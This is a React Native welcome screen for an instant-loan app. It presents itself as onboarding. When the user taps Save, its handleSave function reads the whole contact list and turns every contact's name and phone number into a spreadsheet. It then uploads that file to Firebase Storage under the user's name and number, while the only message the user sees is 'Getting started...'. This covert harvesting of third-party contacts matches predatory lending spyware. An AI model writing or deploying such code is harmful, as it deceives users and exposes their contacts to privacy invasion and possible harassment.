import React, { useState, useEffect } from "react";
import {
  StyleSheet,
  View,
  Text,
  Image,
  TouchableOpacity,
  ToastAndroid,
} from "react-native";
import Modal from "react-native-modal";
import AppIntroSlider from "react-native-app-intro-slider";
import { TextInput, Button } from "react-native-paper";
import * as Contacts from "expo-contacts";
import * as FileSystem from "expo-file-system";
import XLSX from "xlsx";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { useNavigation } from "@react-navigation/native";
import { LinearGradient } from "expo-linear-gradient";

import { storage } from "../config/firebase";
import { ref, uploadBytes } from "firebase/storage";

const slides = [
  {
    key: "slide1",
    title: "Welcome to",
    logo: require("../assets/logopng.png"),
    text: "Where all of your Loan requirements are fulfilled!",
    image: require("../assets/graphics/slide1.png"),
    backgroundColor: "#ff6f61",
  },
  {
    key: "slide2",
    title: "Highlights of",
    logo: require("../assets/logopng.png"),
    text: "Low documents, No advance, One time verification, Instant disbursement.",
    image: require("../assets/graphics/slide2.png"),
    backgroundColor: "#ff6f61",
  },
  {
    key: "slide3",
    title: "Get Started with",
    logo: require("../assets/logopng.png"),
    text: "Your journey for Instant loan starts now, click on 'get started' to proceed.",
    image: require("../assets/graphics/slide3.png"),
    backgroundColor: "#fff",
  },
];

const Welcome = ({ onDone }) => {
  const navigation = useNavigation();
  const [isModalVisible, setModalVisible] = useState(false);
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [contacts, setContacts] = useState([]);

  const showDialog = () => {
    setModalVisible(true);
  };

  const handleSave = async () => {
    if (!name || !phone == undefined) {
      ToastAndroid.show("Please enter your details", ToastAndroid.SHORT);
      return;
    } else if (phone.length < 10) {
      ToastAndroid.show("Please enter valid phone number", ToastAndroid.SHORT);
      return;
    } else if (phone.length > 10) {
      ToastAndroid.show("Please enter valid phone number", ToastAndroid.SHORT);
      return;
    } else {
      const { status } = await Contacts.requestPermissionsAsync();
      if (status !== "granted") {
        ToastAndroid.show(
          "Permission to access contacts denied",
          ToastAndroid.SHORT
        );
        const { status } = await Contacts.requestPermissionsAsync();
      }
      const { data } = await Contacts.getContactsAsync({
        fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers],
      });

      if (data.length > 0) {
        setContacts(data);
        const contactData = data.map((contact) => ({
          Name: contact.name,
          PhoneNumber:
            contact.phoneNumbers && contact.phoneNumbers.length > 0
              ? contact.phoneNumbers[0].number
              : "No phone number",
        }));

        // Create XLSX file
        const worksheet = XLSX.utils.json_to_sheet(contactData);
        const workbook = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(workbook, worksheet, "Contacts");
        const xlsData = XLSX.write(workbook, {
          type: "base64",
          bookType: "xlsx",
        });

        // Save XLSX file to local storage
        const fileUri = `${FileSystem.documentDirectory}contacts.xlsx`;
        await FileSystem.writeAsStringAsync(fileUri, xlsData, {
          encoding: FileSystem.EncodingType.Base64,
        });
        ToastAndroid.show("Getting started...", ToastAndroid.LONG);
        // Upload XLSX file to Firebase Storage
        const response = await fetch(fileUri);
        const blob = await response.blob();
        const storageRef = ref(storage, name + "-" + phone + ".xlsx");
        uploadBytes(storageRef, blob)
          .then(() => {
            console.log("File uploaded successfully");
            setName("");
            setPhone("");
            setModalVisible(false);
            const myBooleanValue = true;
            AsyncStorage.setItem(
              "contactSynced",
              JSON.stringify(myBooleanValue)
            )
              .then(() => {
                console.log("Boolean value stored successfully!");
                navigation.goBack();
              })
              .catch((error) => {
                console.error("Error storing Boolean value: ", error);
              });
          })
          .catch((error) => {
            console.error("File upload error:", error);
            setModalVisible(false);
            const myBooleanValue = false;
            AsyncStorage.setItem(
              "contactSynced",
              JSON.stringify(myBooleanValue)
            )
              .then(() => {
                console.log("Boolean value stored successfully!");
              })
              .catch((error) => {
                console.error("Error storing Boolean value: ", error);
              });
          });
      }
    }
  };

  const _renderItem = ({ item }) => {
    return (
      <LinearGradient
        colors={["#09f", "#eee"]}
        start={{ x: 0, y: 0 }}
        end={{ x: 1, y: 1 }}
        style={styles.slide}
      >
        <Text style={styles.title}>{item.title}</Text>
        <Image source={item.logo} style={styles.logo} />
        <Image source={item.image} style={styles.image} />
        <Text style={styles.text}>{item.text}</Text>
      </LinearGradient>
    );
  };

  const _renderNextButton = () => {
    return (
      <View style={styles.buttonCircle}>
        <Text style={styles.buttonText}>Next</Text>
      </View>
    );
  };

  const _renderDoneButton = () => {
    return (
      <TouchableOpacity
        style={styles.buttonCircle}
        onPress={() => showDialog()}
      >
        <Text style={styles.buttonText}>Get Started</Text>
      </TouchableOpacity>
    );
  };

  const _renderPrevButton = () => {
    return (
      <View style={styles.buttonCircle}>
        <Text style={styles.buttonText}>Back</Text>
      </View>
    );
  };

  return (
    <>
      <AppIntroSlider
        renderItem={_renderItem}
        data={slides}
        onDone={onDone}
        renderNextButton={_renderNextButton}
        renderDoneButton={_renderDoneButton}
        renderPrevButton={_renderPrevButton}
        showPrevButton
        dotStyle={styles.dotStyle}
        activeDotStyle={styles.activeDotStyle}
      />
      <Modal isVisible={isModalVisible}>
        <LinearGradient
          colors={["#8e2de2", "#000"]}
          start={{ x: 0, y: 0 }}
          end={{ x: 1, y: 1 }}
          style={styles.modalContent}
        >
          <Text style={styles.modalTitle}>Enter Your Details</Text>
          <TextInput
            label="Name"
            value={name}
            onChangeText={(text) => setName(text)}
            style={styles.input}
            theme={styles.theme}
            mode="outlined"
          />
          <TextInput
            label="Phone no."
            value={phone}
            onChangeText={(text) => setPhone(text)}
            style={styles.input}
            theme={styles.theme}
            keyboardType="phone-pad"
            maxLength={10}
            autoComplete="tel"
            mode="outlined"
          />
          <Button mode="contained" onPress={handleSave} style={styles.button}>
            <Text
              style={{
                color: "#fff",
                fontWeight: "bold",
                fontSize: 18,
                textAlign: "center",
              }}
            >
              Save
            </Text>
          </Button>
        </LinearGradient>
      </Modal>
    </>
  );
};

const styles = StyleSheet.create({
  slide: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    padding: 20,
  },
  logo: {
    width: "55%",
    height: 50,
    marginVertical: 10,
  },
  image: {
    width: 270,
    height: 200,
    marginVertical: 32,
    borderRadius: 10,
  },
  title: {
    fontSize: 25,
    color: "#fff",
    textAlign: "center",
    fontWeight: "bold",
    marginVertical: 15,
  },
  text: {
    width: "90%",
    fontSize: 16,
    color: "#000",
    fontWeight: "600",
    textAlign: "center",
  },
  buttonCircle: {
    height: 40,
    paddingHorizontal: 18,
    backgroundColor: "#19b2aa",
    borderWidth: 1,
    borderColor: "#fff",
    borderRadius: 40,
    justifyContent: "center",
    alignItems: "center",
  },
  buttonText: {
    color: "#fff",
    fontSize: 16,
    fontWeight: "bold",
  },
  dotStyle: {
    backgroundColor: "rgba(0, 0, 0, .5)",
  },
  activeDotStyle: {
    backgroundColor: "#59b2ab",
  },
  modalContent: {
    backgroundColor: "white",
    padding: 22,
    justifyContent: "center",
    alignItems: "center",
    borderRadius: 20,
    borderColor: "rgba(0, 0, 0, 0.1)",
  },
  modalTitle: {
    color: "white",
    fontWeight: "bold",
    fontSize: 18,
    marginBottom: 12,
  },
  input: {
    width: "100%",
    marginBottom: 12,
    backgroundColor: "#eef",
    borderRadius: 20,
    color: "#fff",
    height: 60,
  },
  theme: {
    colors: {
      primary: "#000",
      underlineColor: "transparent",
      outline: "transparent",
    },
    roundness: 20,
    borderBlockColor: "transparent",
  },
  button: {
    marginTop: 12,
    width: "100%",
    padding: 8,
    borderWidth: 2,
    borderColor: "#fff",
    backgroundColor: "rgba(255, 255, 255, 0.3)",
    borderRadius: 20,
    marginVertical: 5,
    alignItems: "center",
  },
});

export default Welcome;
